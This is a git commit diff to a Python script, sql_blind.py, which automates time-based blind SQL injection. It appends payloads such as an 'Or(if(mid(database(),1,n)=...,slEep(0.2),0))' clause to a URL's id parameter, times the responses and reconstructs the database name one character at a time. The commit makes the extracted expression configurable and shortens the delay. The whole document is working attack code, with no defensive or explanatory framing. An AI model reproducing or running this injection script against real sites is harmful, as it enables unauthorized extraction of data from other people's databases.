4a7b2f0e2ae6e5e859e03413a779526e64733b3c
Zcl1aX <im3xxi@gmail.com>
2016-09-30 12:40:19 +0300

    Update sql_blind.py

--- sql_blind.py
+++ sql_blind.py
@@ -4,24 +4,24 @@ import string
 import sys
 import collections
 import time
-from itertools import product
 
 
-
-dic_chars = string.digits + string.ascii_letters
+spec_ = '!@#$%&*?^.,-+='
+dic_ = string.digits + string.ascii_letters
 stt = ''
 numm = 1
 dic = string.ascii_letters
+sqlf = 'database()'
 url_ = """http://localhost/?id=1'"""
 for a in range(5):
     for i in dic:
-        pay = """ Or(if(mid(database(),1,%d)='%s%c',slEep(5),0))+--+""" % (numm, stt, i)
+        pay = """ Or(if(mid(%s,1,%d)='%s%c',slEep(0.2),0))+--+""" % (sqlf, numm, stt, i)
         url = url_ + pay
         start = time.time()
         r = requests.post(url)
         stop = time.time()
-        if stop - start > 5:
+        if stop - start > 1:
             stt +=i
-            numm = numm + 1
-            print("str=",stt, "target url=",url)
+            numm +=1
+            print(sqlf,"=",stt)
             
